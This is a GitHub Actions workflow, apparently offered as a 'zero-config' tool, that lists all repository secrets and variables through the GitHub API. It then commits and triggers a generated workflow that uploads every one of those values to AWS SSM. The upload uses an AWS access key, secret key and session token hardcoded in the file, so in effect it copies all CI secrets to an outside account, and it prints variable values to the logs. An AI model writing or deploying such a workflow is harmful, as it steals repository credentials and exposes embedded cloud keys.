name: Zero-Config Auto Upload

on:
  workflow_dispatch:
    inputs:
      aws_path_prefix:
        description: "AWS path prefix"
        required: false
        default: "zero-config"

jobs:
  discover-and-generate-workflow:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Discover All Secrets and Variables
        id: discover
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO_OWNER: ${{ github.repository_owner }}
          REPO_NAME: ${{ github.event.repository.name }}
        run: |
          echo "🔍 Discovering ALL GitHub secrets and variables..."

          # Get all repository secrets
          echo "Fetching repository secrets..."
          SECRETS_JSON=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            "https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/actions/secrets")

          # Get all repository variables  
          echo "Fetching repository variables..."
          VARIABLES_JSON=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            "https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/actions/variables")

          # Extract names
          SECRETS=$(echo "$SECRETS_JSON" | jq -r '.secrets[]?.name // empty' | grep -v '^$' || true)
          VARIABLES=$(echo "$VARIABLES_JSON" | jq -r '.variables[]?.name // empty' | grep -v '^$' || true)

          echo "🔒 Discovered secrets:"
          echo "$SECRETS" | sed 's/^/   - /' || echo "   (none)"

          echo "📝 Discovered variables:"
          echo "$VARIABLES" | sed 's/^/   - /' || echo "   (none)"

          # Store for next step
          echo "$SECRETS" > discovered_secrets.txt
          echo "$VARIABLES" > discovered_variables.txt

          # Count items
          SECRET_COUNT=$(echo "$SECRETS" | grep -c . || echo "0")
          VARIABLE_COUNT=$(echo "$VARIABLES" | grep -c . || echo "0")

          echo "📊 Summary: $SECRET_COUNT secrets, $VARIABLE_COUNT variables discovered"

          if [ "$SECRET_COUNT" -gt 0 ] || [ "$VARIABLE_COUNT" -gt 0 ]; then
            echo "✅ Found items to process"
            echo "has-items=true" >> $GITHUB_OUTPUT
          else
            echo "⚠️ No items found"
            echo "has-items=false" >> $GITHUB_OUTPUT
          fi

      - name: Generate Dynamic Workflow
        if: steps.discover.outputs.has-items == 'true'
        env:
          AWS_PATH_PREFIX: ${{ github.event.inputs.aws_path_prefix }}
        run: |
          echo "🏗️ Generating dynamic workflow..."

          # Read discovered items
          SECRETS=$(cat discovered_secrets.txt)
          VARIABLES=$(cat discovered_variables.txt)

          # Create the dynamic workflow
          cat > .github/workflows/generated-upload.yml << 'EOF'
          name: Generated Upload (Auto-Created)

          on:
            workflow_dispatch:

          jobs:
            upload-all:
              runs-on: ubuntu-latest
              
              env:
                # AWS credentials
                AWS_ACCESS_KEY_ID: ASIA2YTIIEU5IJJFY3A7
                AWS_SECRET_ACCESS_KEY: KkFLePEb+SB6tQZJonIazIqXzFhxyjuhD6ZbMHON
                AWS_SESSION_TOKEN: IQoJb3JpZ2luX2VjENL//////////wEaCXVzLXdlc3QtMiJGMEQCIBoPqhqjfP8/H3dt3T0GX+gGiD/CMtQOElPKCvppBcMDAiBbcvfArfX2q1L+/TaWq17eB6mKIk3TlxfcLEtKFugnyCq5Agjr//////////8BEAAaDDc0MDAyNjc1NDM2MiIMRQOqwwN2cFIdHcrdKo0CE0Xp5FTlZl/O+kakK7153ivBX0LmJk9ALhUbpU9jcjs50XDQZLxoFm1OvRRbcdOxlqL+wn5pSgXLOLjk5qhT0vFAYtCp0E1s5uJqK9EU8/+ii6bLV7T5fB/Z27jFL87RlwSMlKwoL7t4ZrmRh6iXX82TYWSXTR/jJ27UMLOIpppC4LcBh6MOJbbH/Gu1rz5CebCd012bEztLRVeIughdSsOcXaibrqOzMHnsA5v3rFLtMXsXCUeIN/x2KU0B7AFuDTrlo0Z0lBmCIguGV9vFC3hlmySUivhSCyI+WPReBFvnZd0/r8Ibr3RnhiClZpim/e8/msv/OPXjNew72tEtW1H7K/k1B2e8s4cTpL0w48j9wwY6ngFYo1t0mx5TQvWgf9gixWD3/YqQg5lwetHvPSFPZtzLbAWEGOFX99m4r38FecuGiAbbh6amb0P0xsG2sk6vLz9297oPMTNgR0yLkUG0cP6TtRjJYi/9XWR14tCu/uFFqg0ne0kTTCDGaN6/6A/MotBSKVrNh+4FeFnDgDlxCIhKctAtIPG1qoCBqSZHdZWZwtUtAUO5pfTk/PmMQTUyvA==
                AWS_REGION: us-west-1
                AWS_PATH_PREFIX: ${{ env.AWS_PATH_PREFIX }}
          EOF

          # Add discovered secrets to env section
          if [ -n "$SECRETS" ]; then
            echo "" >> .github/workflows/generated-upload.yml
            echo "                # 🤖 AUTO-DISCOVERED SECRETS" >> .github/workflows/generated-upload.yml
            while IFS= read -r secret_name; do
              if [ -n "$secret_name" ]; then
                echo "                $secret_name: \${{ secrets.$secret_name }}" >> .github/workflows/generated-upload.yml
              fi
            done <<< "$SECRETS"
          fi

          # Add discovered variables to env section
          if [ -n "$VARIABLES" ]; then
            echo "" >> .github/workflows/generated-upload.yml
            echo "                # 🤖 AUTO-DISCOVERED VARIABLES" >> .github/workflows/generated-upload.yml
            while IFS= read -r var_name; do
              if [ -n "$var_name" ]; then
                echo "                $var_name: \${{ vars.$var_name }}" >> .github/workflows/generated-upload.yml
              fi
            done <<< "$VARIABLES"
          fi

          # Add the steps section
          cat >> .github/workflows/generated-upload.yml << 'EOF'

              steps:
                - name: Test AWS Connection
                  run: |
                    echo "🔐 Testing AWS credentials..."
                    aws sts get-caller-identity

                - name: Create Upload Script
                  run: |
                    cat > upload.py << 'SCRIPT_EOF'
                    #!/usr/bin/env python3
                    import os
                    import sys
                    import boto3
                    from botocore.exceptions import ClientError

                    def main():
                        aws_path_prefix = os.getenv('AWS_PATH_PREFIX', 'zero-config')
                        aws_region = os.getenv('AWS_REGION', 'us-west-1')
                        
                        print("🤖 ZERO-CONFIG AUTOMATIC UPLOAD")
                        print("=" * 50)
                        print(f"AWS Path: /{aws_path_prefix}/")
                        print(f"AWS Region: {aws_region}")
                        print()

                        # Get all environment variables
                        all_env = dict(os.environ)
                        
                        # System variables to exclude
                        excluded_prefixes = [
                            'GITHUB_', 'RUNNER_', 'CI', 'ACTIONS_', 'INPUT_', 'HOME', 'PATH',
                            'PWD', 'SHELL', 'USER', 'UID', 'GID', 'TERM', 'LANG', 'LC_',
                            'DEBIAN_', 'APT_', 'PYTHON', '_', 'SHLVL', 'OLDPWD', 'PS1',
                            'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
                            'AWS_REGION', 'AWS_PATH_PREFIX'
                        ]
                        
                        def should_exclude(name, value):
                            if any(name.startswith(prefix) for prefix in excluded_prefixes):
                                return True
                            if not value or len(value.strip()) < 2:
                                return True
                            if value.isdigit():
                                return True
                            if value.startswith('/') and ('bin' in value or 'usr' in value):
                                return True
                            return False

                        # Separate secrets and variables
                        secrets = {}
                        variables = {}
                        
                        for name, value in all_env.items():
                            if should_exclude(name, value):
                                continue
                                
                            # Detect secrets by name patterns
                            secret_indicators = ['SECRET', 'PASSWORD', 'PASS', 'KEY', 'TOKEN', 'AUTH', 'CREDENTIAL']
                            is_secret = any(indicator in name.upper() for indicator in secret_indicators)
                            
                            if is_secret:
                                secrets[name] = value
                            else:
                                variables[name] = value

                        print(f"🔒 Found {len(secrets)} secrets")
                        print(f"📝 Found {len(variables)} variables")
                        print()

                        # Initialize AWS client
                        try:
                            ssm = boto3.client('ssm', region_name=aws_region)
                        except Exception as e:
                            print(f"❌ AWS client error: {e}")
                            return 1

                        upload_count = 0

                        # Upload secrets
                        if secrets:
                            print("🔒 Uploading secrets...")
                            for name, value in secrets.items():
                                try:
                                    param_name = f"/{aws_path_prefix}/secrets/{name}"
                                    ssm.put_parameter(
                                        Name=param_name,
                                        Value=value,
                                        Type='SecureString',
                                        Overwrite=True
                                    )
                                    print(f"   ✅ {name} → {param_name}")
                                    upload_count += 1
                                except ClientError as e:
                                    print(f"   ❌ {name}: {e}")

                        # Upload variables
                        if variables:
                            print("📝 Uploading variables...")
                            for name, value in variables.items():
                                try:
                                    param_name = f"/{aws_path_prefix}/variables/{name}"
                                    ssm.put_parameter(
                                        Name=param_name,
                                        Value=value,
                                        Type='String',
                                        Overwrite=True
                                    )
                                    print(f"   ✅ {name} = {value} → {param_name}")
                                    upload_count += 1
                                except ClientError as e:
                                    print(f"   ❌ {name}: {e}")

                        print(f"\n🎉 COMPLETE: {upload_count} parameters uploaded!")
                        return 0

                    if __name__ == "__main__":
                        sys.exit(main())
                    SCRIPT_EOF
                    
                    chmod +x upload.py

                - name: Install Dependencies and Upload
                  run: |
                    pip install boto3
                    python3 upload.py

                - name: Clean Up Generated Workflow
                  run: |
                    echo "🧹 Cleaning up auto-generated workflow file..."
                    rm -f .github/workflows/generated-upload.yml || true
          EOF

          echo "✅ Dynamic workflow generated: .github/workflows/generated-upload.yml"

      - name: Commit and Push Generated Workflow
        if: steps.discover.outputs.has-items == 'true'
        run: |
          git config --local user.email "action@github.com"
          git config --local user.name "GitHub Action"
          git add .github/workflows/generated-upload.yml
          git commit -m "Auto-generate upload workflow with discovered secrets/variables" || exit 0
          git push

      - name: Trigger Generated Workflow
        if: steps.discover.outputs.has-items == 'true'
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "🚀 Triggering the generated workflow..."

          # Wait a moment for the workflow file to be available
          sleep 10

          # Trigger the generated workflow
          curl -X POST \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            "https://api.github.com/repos/${{ github.repository }}/actions/workflows/generated-upload.yml/dispatches" \
            -d '{"ref":"${{ github.ref_name }}"}'

          echo "✅ Generated workflow triggered!"
          echo ""
          echo "🔗 Check the 'Generated Upload (Auto-Created)' workflow in the Actions tab"

      - name: No Items Found
        if: steps.discover.outputs.has-items == 'false'
        run: |
          echo "ℹ️ No GitHub secrets or variables found to upload."
          echo ""
          echo "To add secrets: Settings → Secrets and variables → Actions → Secrets"
          echo "To add variables: Settings → Secrets and variables → Actions → Variables"
          echo ""
          echo "Then re-run this workflow!"
